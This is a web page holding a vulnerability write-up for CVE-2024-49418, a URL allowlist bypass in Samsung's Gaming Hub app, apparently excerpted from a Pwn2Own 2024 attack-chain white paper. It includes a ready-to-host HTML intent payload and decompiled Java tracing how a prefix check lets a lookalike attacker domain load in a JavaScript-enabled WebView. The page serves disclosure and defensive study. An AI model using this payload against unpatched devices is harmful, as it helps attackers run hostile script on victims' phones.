<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Samsung GamingHub URL Whitelist Bypass - CVE-2024-49418 | Malicious Erection LLC</title>
<meta name="generator" content="Jekyll v4.4.1" />
<meta property="og:title" content="Samsung GamingHub URL Whitelist Bypass - CVE-2024-49418" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Insufficient verification of url authenticity in GamingHub prior to version 6.1.03.4 in Korea, 7.1.02.4 in Global allows remote attackers to enable JavaScript in its webview." />
<meta property="og:description" content="Insufficient verification of url authenticity in GamingHub prior to version 6.1.03.4 in Korea, 7.1.02.4 in Global allows remote attackers to enable JavaScript in its webview." />
<link rel="canonical" href="https://maliciouserection.com/cves/2024-12-01_cve-2024-49418/" />
<meta property="og:url" content="https://maliciouserection.com/cves/2024-12-01_cve-2024-49418/" />
<meta property="og:site_name" content="Malicious Erection LLC" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2024-12-01T00:00:00+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Samsung GamingHub URL Whitelist Bypass - CVE-2024-49418" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-12-01T00:00:00+00:00","datePublished":"2024-12-01T00:00:00+00:00","description":"Insufficient verification of url authenticity in GamingHub prior to version 6.1.03.4 in Korea, 7.1.02.4 in Global allows remote attackers to enable JavaScript in its webview.","headline":"Samsung GamingHub URL Whitelist Bypass - CVE-2024-49418","mainEntityOfPage":{"@type":"WebPage","@id":"https://maliciouserection.com/cves/2024-12-01_cve-2024-49418/"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"https://maliciouserection.com/assets/images/logo.png"}},"url":"https://maliciouserection.com/cves/2024-12-01_cve-2024-49418/"}</script>
<!-- End Jekyll SEO tag -->

    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Work+Sans&display=swap"
      rel="stylesheet"
    />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"
    />
    <link rel="stylesheet" href="/assets/css/main.css" />
  </head>

  <body class="flex flex-col h-screen antialiased">
    <div 
  class="flex-none bg-base-100 shadow-sm h-20 navbar"
  style="height: 10rem;"
>
  <div 
    class="flex-none navbar-start"
    style="height: 9rem;"
  >
    <div class="shadow-lg dropdown">
      <div tabindex="0" role="button" class="lg:hidden btn btn-ghost">
        <svg
          xmlns="http://www.w3.org/2000/svg"
          class="w-5 h-5"
          fill="none"
          viewBox="0 0 24 24"
          stroke="currentColor"
        >
          <path
            stroke-linecap="round"
            stroke-linejoin="round"
            stroke-width="2"
            d="M4 6h16M4 12h8m-8 6h16"
          />
        </svg>
      </div>
      <ul
        tabindex="0"
        class="z-[1] space-y-5 bg-base-100 shadow mt-3 p-2 rounded-box w-72 menu menu-sm dropdown-content"
      >
        
        <li class="text-secondary text-lg">
          <a href="/">Home</a>
        </li>
        
        <li class="text-secondary text-lg">
          <a href="/blog">Blog</a>
        </li>
        
        <li class="text-secondary text-lg">
          <a href="/tools">Tools</a>
        </li>
        
        <li class="text-secondary text-lg">
          <a href="/vulnerability-disclosure-policy">Vulnerability Disclosure Policy</a>
        </li>
        
        <li class="text-secondary text-lg">
          <a href="/cves">CVEs</a>
        </li>
        
      </ul>
    </div>
    <a 
      href="/" 
      title="Malicious Erection LLC" 
      class="px-5"
      style="height: 7rem;"
    >
      <img
        src="/assets/images/logo.png"
        alt="Malicious Erection LLC"
        class="w-32 object-center image-center"
        style="width: 15rem;"
      />
    </a>
  </div>
  <div class="hidden lg:flex flex-1 gap-3 navbar-end">
    <ul class="gap-3 px-1 menu menu-horizontal">
      
      <li class="font-semibold text-base">
        <a href="/">Home</a>
      </li>
      
      <li class="font-semibold text-base">
        <a href="/blog">Blog</a>
      </li>
      
      <li class="font-semibold text-base">
        <a href="/tools">Tools</a>
      </li>
      
      <li class="font-semibold text-base">
        <a href="/vulnerability-disclosure-policy">Vulnerability Disclosure Policy</a>
      </li>
      
      <li class="font-semibold text-base">
        <a href="/cves">CVEs</a>
      </li>
      
    </ul>
  </div>
</div>

    <div class="flex-1 overflow-y-auto">
      <div class="min-h-[80vh]"><main>
  <!-- Header Section -->
  <section class="flex justify-center items-center bg-secondary/75 py-16">
    <h1 class="font-bold text-neutral-content text-5xl text-center">Samsung GamingHub URL Whitelist Bypass - CVE-2024-49418</h1>
  </section>

  <!-- Content Section -->
  <section class="mx-auto py-10 text-neutral-content prose px-4 sm:px-6 lg:px-8 max-w-full lg:max-w-5xl xl:max-w-[1100px]">
    <p>The below snippet is taken from the full white paper, available here: <a href="/2025/05/13/pwn2own-ireland-2024-samsung-s24-attack-chain-whitepaper.html">https://maliciouserection.com/2025/05/13/pwn2own-ireland-2024-samsung-s24-attack-chain-whitepaper.html</a></p>

<p>I think you should read the white paper instead :)</p>

<hr />

<h4 id="exploit-payload">Exploit Payload</h4>

<p>Below is the payload used in this chain link. An attacker should host this HTML code and trick a user into tapping the hyperlink on their phone:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;html&gt;
    &lt;body&gt;
        &lt;h1&gt;
        &lt;a href=" intent://com.samsung.android.game.gamehome/gmp?url=https://us.mcsvc.samsung.com.&lt;redacted&gt;.com?yayattackeryay=&lt;attackerServer&gt;#Intent;scheme=gamelauncher;end"&gt;yaypocyay&lt;/a&gt;
        &lt;/h1&gt;
    &lt;/body&gt;
&lt;/html&gt;
</code></pre></div></div>

<h4 id="exploit-details">Exploit Details</h4>

<p>The application “Gaming Hub” (<code class="language-plaintext highlighter-rouge">com.samsung.android.game.gamehome</code> version 7.1.01.7) contains an exported Activity (<code class="language-plaintext highlighter-rouge">com.samsung.android.game.gamehome.app.MainActivity</code>) which can be launched via Browsable Intent. Depending on the Data URI attached to the Intent, different actions can be executed when the Intent is processed.</p>

<p><code class="language-plaintext highlighter-rouge">MainActivity</code> retrieves the incoming Browsable Intent via the following code, which then passes the Intent onto the class <code class="language-plaintext highlighter-rouge">com.samsung.android.game.gamehome.gmp.ui.GmpDeepLinkUtil</code> method <code class="language-plaintext highlighter-rouge">c(Context, Intent)</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public final class MainActivity extends a {
...
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        ...
        if (bundle == null) {
            Intent intent = getIntent();
            m0(intent);
        }
    ...
    public final void m0(Intent intent) {
        Intent deepLinkIntent = GmpDeepLinkUtil.a.c(this, intent);
        if (deepLinkIntent != null) {
            startActivity(deepLinkIntent);
            finish();
        ...
    }
</code></pre></div></div>

<p>The class <code class="language-plaintext highlighter-rouge">GmpDeepLinkUtil</code> will extract the Data URI from the Intent and create a new Intent object based on the first path segment of the URI. If the first path segment is set to “gmp”, then the following actions are taken:</p>

<ul>
  <li>Create a new Intent object and set the component value of that Intent object to <code class="language-plaintext highlighter-rouge">com.samsung.android.game.gamehome.gmp.ui.web.GmpWebActivity</code></li>
  <li>In the URI object, retrieve the GET parameter “url” and add it as an Intent String Extra called “url” to the newly created Intent object</li>
  <li>Adds the value “WebView” as an Intent String extra called “target” to the newly created Intent object</li>
  <li>Return the newly created Intent object</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public final class GmpDeepLinkUtil {
...
    public final Intent c(Context context, Intent intent) {
        
        Uri yayuriyay = intent.getData();
        if (yayuriyay == null) {
            return null;
        }
        return d(context, yayuriyay);
    }

    public final Intent d(Context context, Uri yayuriyay) {
        try {
            ...
            String yayfirstpathyay = i(yayuriyay); // retrieves first path value
            ...
            Intent yayintentyay = a(); // create new Intent object
            if (yayfirstpathyay != null) {
                switch (yayfirstpathyay.hashCode()) {
                    ...
                    case 102474: // first path equals `gmp` 
                        if (!yayfirstpathyay.equals("gmp")) {
                            break;
                        } else {
                            String yayqueryyay = yayuriyay.getQueryParameter("url");
                            if (yayqueryyay == null) {
                                return null;
                            }
                            yayintentyay.putExtra("url", yayqueryyay);
                            yayintentyay.putExtra("target", Path.WebView.name());
                            yayintentyay.setClass(context, GmpWebActivity.class);
                            return yayintentyay;
                        }
                    ...
        }
    }
</code></pre></div></div>

<p>Once the new Intent object is returned, it is passed back to class <code class="language-plaintext highlighter-rouge">MainActivity</code> method <code class="language-plaintext highlighter-rouge">k0(Intent)</code>. From there, <code class="language-plaintext highlighter-rouge">startActivity(Intent)</code> is executed against the Intent object, which will launch the component <code class="language-plaintext highlighter-rouge">com.samsung.android.game.gamehome.gmp.ui.web.GmpWebActivity</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public final class MainActivity extends a {
...
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        ...
        if (bundle == null) {
            Intent intent = getIntent();
            k0(intent);
        }
    ...
    public final void k0(Intent intent) {
        Intent deepLinkIntent = GmpDeepLinkUtil.a.c(this, intent);
        if (deepLinkIntent != null) {
            startActivity(deepLinkIntent);
            finish();
        ...
    }
</code></pre></div></div>

<p>In the class <code class="language-plaintext highlighter-rouge">com.samsung.android.game.gamehome.gmp.ui.web.GmpWebActivity</code> method <code class="language-plaintext highlighter-rouge">onCreate(Bundle)</code>, the incoming Intent object is retrieved and the Intent String extra “target” is analyzed. Since the value is set to “WebView”, the application will perform two actions.</p>

<p>First, the Intent object is passed to class <code class="language-plaintext highlighter-rouge">com.samsung.android.game.gamehome.gmp.ui.GmpDeepLinkUtil</code> method <code class="language-plaintext highlighter-rouge">j(Intent)</code> to retrieve and return the Intent String extra “url”.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public final class GmpWebActivity extends s implements n, p {
...
    
    public void onCreate(Bundle bundle) {
        GmpDeepLinkUtil.Path path;
        super.onCreate(bundle);
        ...
        if (bundle == null) {
            ...
            Intent intent = getIntent();
            path = gmpDeepLinkUtil.h(intent); // retrieves the String extra "target"
        } else {
            path = null;
        }
        int i = path == null ? -1 : b.a[path.ordinal()]; // checks value of "target"
        if (i == 1) {
            ...
        } else if (i == 3) {
            GmpDeepLinkUtil gmpDeepLinkUtil = GmpDeepLinkUtil.a; // new instance
            Intent yayintentyay = getIntent();
            E0(this, gmpDeepLinkUtil.j(yayintentyay), null, false, true, 2, null);
    ...
</code></pre></div></div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public final class GmpDeepLinkUtil {
...
    public final String j(Intent intent) {
        String stringExtra = intent.getStringExtra("url");
        return stringExtra == null ? "" : stringExtra;
    }
</code></pre></div></div>

<p>Next, the returned “url” String extra is passed to class <code class="language-plaintext highlighter-rouge">GmpWebActivity</code> method <code class="language-plaintext highlighter-rouge">E0(GmpWebActivity, String, String, Boolean, Boolean, int, Object)</code>, which passes the “url” to method <code class="language-plaintext highlighter-rouge">D0(String, String, boolean, boolean)</code>, which then passes the URL to method <code class="language-plaintext highlighter-rouge">v0(String)</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public final class GmpWebActivity extends s implements n, p {
...
    
    public void onCreate(Bundle bundle) {
        GmpDeepLinkUtil.Path path;
        super.onCreate(bundle);
        ...
        if (bundle == null) {
            ...
            Intent intent = getIntent();
            path = gmpDeepLinkUtil.h(intent); // retrieves the String extra "target"
        } else {
            path = null;
        }
        int i = path == null ? -1 : b.a[path.ordinal()]; // checks value of "target"
        if (i == 1) {
            ...
        } else if (i == 3) {
            GmpDeepLinkUtil gmpDeepLinkUtil = GmpDeepLinkUtil.a; // new instance
            Intent yayintentyay = getIntent();
            E0(this, gmpDeepLinkUtil.j(yayintentyay), null, false, true, 2, null);
    ...

    public static void E0(GmpWebActivity gmpWebActivity, String yayurlyay, String str2, boolean z, boolean z2, int i, Object obj) {
        ...
        gmpWebActivity.D0(yayurlyay, str2, z, z2);
    }
    ...

    public final void D0(String yayurlyay, String str2, boolean z, boolean z2) {
        ...
        final String yayparsedurlyay = q0(yayurlyay); // do stuff if url scheme is either `gamelauncher` or `gmp`
        v0(yayparsedurlyay);
</code></pre></div></div>

<p>In the method <code class="language-plaintext highlighter-rouge">v0(String)</code>, a WebView is set to object d and configured. One thing to note is that the “url” value is passed to class <code class="language-plaintext highlighter-rouge">com.samsung.android.game.gamehome.gmp.ui.web.GmpWebViewModel</code> method <code class="language-plaintext highlighter-rouge">F(String)</code> to check if the “url” value is a valid URL.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public final class GmpWebActivity extends s implements n, p {
...
    
    public final void v0(String yayurlyay) {
        WebView webView = r0().d;
        WebSettings settings = webView.getSettings();
        settings.setDomStorageEnabled(true);
        ...
        if (s0().F(yayurlyay)) {
            p0(webView);
        }
    }
</code></pre></div></div>

<p>The method F(String) passes the “url” value to multiple different areas of the application. One of these checks determines if the “url” value starts with one of the following:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">https://us.mcsvc.samsung.com</code></li>
  <li><code class="language-plaintext highlighter-rouge">https://d2da9i65hvaere.cloudfront.net/</code></li>
  <li><code class="language-plaintext highlighter-rouge">https://gmp.samsungapps.com</code></li>
  <li><code class="language-plaintext highlighter-rouge">https://img.samsungapps.com/</code></li>
  <li><code class="language-plaintext highlighter-rouge">https://d1559sbyyf3apa.cloudfront.net/</code></li>
  <li><code class="language-plaintext highlighter-rouge">https://smax.samsungapps.com</code></li>
  <li><code class="language-plaintext highlighter-rouge">https://d2da9i65hvaere.cloudfront.net/</code></li>
</ul>

<h4 id="bug-1--insufficient-check-against-the-url">BUG 1 – Insufficient check against the URL</h4>

<p>Some of the URLs above did not end with the “/” character. Because of this, the host value of the incoming “url” simply needs to start with one of the vulnerable values.</p>

<p>For example, in this exploit chain, our “url” value is set to <code class="language-plaintext highlighter-rouge">https://us.mcsvc.samsung.com.maliciouserection.com?yayattackeryay=&lt;attackerServer&gt;</code>. Since the URL does start with <code class="language-plaintext highlighter-rouge">https://us.mcsvc.samsung.com</code>, this check will pass successfully.</p>

<p>After the check in the <code class="language-plaintext highlighter-rouge">F(String)</code> method is checked and it passes, the “url” value is passed to method <code class="language-plaintext highlighter-rouge">p0(WebView)</code>. This method will take the WebView object <code class="language-plaintext highlighter-rouge">d</code> and enable JavaScript.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public final class GmpWebActivity extends s implements n, p {
...
    
    public final void v0(String yayurlyay) {
        WebView webView = r0().d;
        WebSettings settings = webView.getSettings();
        settings.setDomStorageEnabled(true);
        ...
        if (s0().F(yayurlyay)) {
            p0(webView);
        }
    }
    ...
    public final void p0(WebView webView) {
        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
        ...
</code></pre></div></div>

<p>Going back to method <code class="language-plaintext highlighter-rouge">D0(String, String, boolean, boolean)</code>, the “url” value is passed to the method <code class="language-plaintext highlighter-rouge">w0(String)</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public final class GmpWebActivity extends s implements n, p {
...
    public final void D0(String yayurlyay, String str2, boolean z, boolean z2) {
        ...
        final String yayparsedurlyay = q0(yayurlyay); // do stuff if url scheme is either `gamelauncher` or `gmp`
        v0(yayparsedurlyay);
        if (z2) {
                s0().G(false, new a() { 
                        ...
                        public final void a() {
                            GmpWebActivity.this.w0(yayparsedurlyay);
                        }
</code></pre></div></div>

<p>In method <code class="language-plaintext highlighter-rouge">w0(String)</code>, the WebView object <code class="language-plaintext highlighter-rouge">d</code> is forced to load the URL value that was stored in our “url” value.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public final class GmpWebActivity extends s implements n, p {
...
    public final void w0(String yayurlyay) {
        ...
        r0().d.loadUrl(yayurlyay);
    }
</code></pre></div></div>

<h4 id="bug-2--webview-loads-any-url">BUG 2 – WebView Loads Any URL</h4>

<p>The WebView does not check the incoming URL before loading the URL. So the “url” value used in our exploit chain (<code class="language-plaintext highlighter-rouge">https://us.mcsvc.samsung.com.maliciouserection.com?yayattackeryay=&lt;attackerServer&gt;</code>) will be loaded into the WebView.</p>

<p>Screenshot of Gaming Hub loading the URL <code class="language-plaintext highlighter-rouge">https://us.mcsvc.samsung.com.maliciouserection.com?yayattackeryay=&lt;attackerServer&gt;</code>:</p>

<div align="center">
    <img src="/assets/images/blog/2025-05-13-pwn2own-ireland-2024-samsung-s24-attack-chain-whitepaper/pwn2own-ireland-2024-whitepaper-1.png" />
</div>

  </section>

  <!-- CTA Button (optional) -->
  
</main>
</div>
      <div class="bg-neutral-800">
  <footer class="mx-auto py-10 container">
    <div class="flex flex-wrap justify-center gap-3 mb-10 align-center">
      
      <a href="/" class="btn btn-secondary btn-ghost"
        >Home</a
      >
      
      <a href="/blog/" class="btn btn-secondary btn-ghost"
        >Blog</a
      >
      
      <a href="/tools" class="btn btn-secondary btn-ghost"
        >Tools</a
      >
      
      <a href="/vulnerability-disclosure-policy" class="btn btn-secondary btn-ghost"
        >Vulnerability Disclosure Policy</a
      >
      
      <a href="/cves/" class="btn btn-secondary btn-ghost"
        >CVEs</a
      >
      
    </div>
    <div class="flex justify-center items-center gap-3 mb-10">
      
      <a
        title="Github"
        href="https://github.com/MaliciousErection"
        class="btn btn-ghost btn-circle"
      >
        <i class="fa fa-github text-xl"></i>
      </a>
      
    </div>
    <p class="text-center">© 2025 Malicious Erection LLC.</p>
  </footer>
</div>

    </div>
  </body>
</html>
